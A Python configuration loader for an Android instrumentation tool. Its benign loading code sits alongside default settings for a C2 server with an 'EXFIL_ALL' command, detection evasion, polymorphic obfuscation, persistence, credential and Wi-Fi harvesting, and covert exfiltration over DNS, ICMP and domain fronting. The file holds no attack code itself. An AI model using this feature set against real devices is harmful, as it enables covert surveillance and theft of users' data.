#!/usr/bin/env python3
"""Shared configuration loader for android-instrumentor."""
from __future__ import annotations

import hashlib
import os
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent
DEFAULT_CONFIG = ROOT / "config.yaml"

_DEFAULTS: dict[str, Any] = {
    "logging": {
        "level": "INFO",
        "format": "%(asctime)s %(levelname)s %(message)s",
        "file": "./logs/app.log",
    },
    "paths": {
        "apktool": "apktool",
        "adb": "adb",
        "android_sdk": os.environ.get("ANDROID_HOME", os.path.expanduser("~/Android/Sdk")),
        "genymotion": os.path.expanduser("~/Documents/Tools/genymotion"),
        "gmtool": os.path.expanduser("~/Documents/Tools/genymotion/gmtool"),
        "frida": "frida",
    },
    "c2": {
        "host": "0.0.0.0",
        "port": 8080,
        "public_host": "10.0.3.2",
        "tls_cert": None,
        "tls_key": None,
        "jitter_ms": 5000,
        "rate_limit_max": 30,
        "session_ttl_hours": 72,
        "commands": ["EXFIL_ALL", "GET_DEVICE_INFO", "LIST_APPS"],
    },
    "emulator": {
        "backend": "genymotion",
        "avd_name": "pixel_6_api_30",
        "vm_name": "Genymotion Phone",
        "ram": 2048,
        "cores": 2,
        "port": 5554,
        "no_window": True,
        "serial": "",
    },
    "analysis": {
        "timeout": 300,
        "frida_enabled": True,
        "frida_script": "frida_hooks.js",
        "evasion_script": "frida_evasion.js",
        "frida_duration": 45,
        "monkey_events": 50,
        "grant_permissions": True,
        "pull_db": True,
    },
    "evasion": {
        "enabled": True,
        "modes": ["root", "frida", "emulator", "debugger", "safetynet"],
        "frida_evasion": True,
        "spoof_build": True,
    },
    "obfuscation": {
        "enabled": True,
        "string_encryption": True,
        "junk_code": True,
        "manifest_patching": True,
        "polymorphic": True,
    },
    "post_exploit": {
        "enabled": True,
        "persistence": True,
        "credential_harvest": True,
        "clipboard_monitor": True,
        "wifi_stealer": True,
    },
    "opsec": {
        "ttl_hours": 72,
        "auto_destruct": True,
        "stealth_logging": True,
        "self_remove_on_detection": True,
        "encrypt_comms": True,
        "cleanup_on_exit": True,
    },
    "covert_channels": {
        "dns_tunnel": False,
        "dns_domain": None,
        "icmp_exfil": False,
        "icmp_target": None,
        "domain_fronting": False,
        "front_cdn": "cloudfront",
        "front_domain": None,
        "traffic_mimicry": True,
        "chunked_exfil": True,
        "chunk_size": 512,
    },
    "feature_extraction": {
        "feature_set": "default",
        "output_format": "json",
    },
    "physical_device": {
        "enabled": False,
        "serial": None,
        "allow_root": False,
        "install_options": "-r -t",
        "timeout": 300,
    },
    "reporting": {
        "enabled": True,
        "format": "html",
        "mitre_attack": True,
        "output_dir": "./reports",
    },
}


def _deep_merge(base: dict, override: dict) -> dict:
    out = dict(base)
    for key, value in (override or {}).items():
        if isinstance(value, dict) and isinstance(out.get(key), dict):
            out[key] = _deep_merge(out[key], value)
        else:
            out[key] = value
    return out


def load_config(path: str | Path | None = None) -> dict[str, Any]:
    cfg_path = Path(path) if path else DEFAULT_CONFIG
    data: dict[str, Any] = {}
    if cfg_path.is_file():
        try:
            import yaml  # type: ignore

            with open(cfg_path, encoding="utf-8") as fh:
                loaded = yaml.safe_load(fh) or {}
            if isinstance(loaded, dict):
                data = loaded
        except Exception:
            data = {}
    merged = _deep_merge(_DEFAULTS, data)

    # Environment overrides
    if os.environ.get("ANDROID_HOME"):
        merged["paths"]["android_sdk"] = os.environ["ANDROID_HOME"]
    if os.environ.get("GENYMOTION_HOME"):
        home = os.environ["GENYMOTION_HOME"]
        merged["paths"]["genymotion"] = home
        merged["paths"]["gmtool"] = os.path.join(home, "gmtool")
    if os.environ.get("GMTOOL"):
        merged["paths"]["gmtool"] = os.environ["GMTOOL"]
    if os.environ.get("ADB_SERIAL"):
        merged["emulator"]["serial"] = os.environ["ADB_SERIAL"]
    return merged


def ensure_dirs(cfg: dict[str, Any] | None = None) -> None:
    cfg = cfg or load_config()
    for rel in ("logs", "output", "output/traces", "results", "models"):
        (ROOT / rel).mkdir(parents=True, exist_ok=True)
    log_file = cfg.get("logging", {}).get("file")
    if log_file:
        Path(log_file).expanduser().resolve().parent.mkdir(parents=True, exist_ok=True)


def file_sha256(path: str | Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()
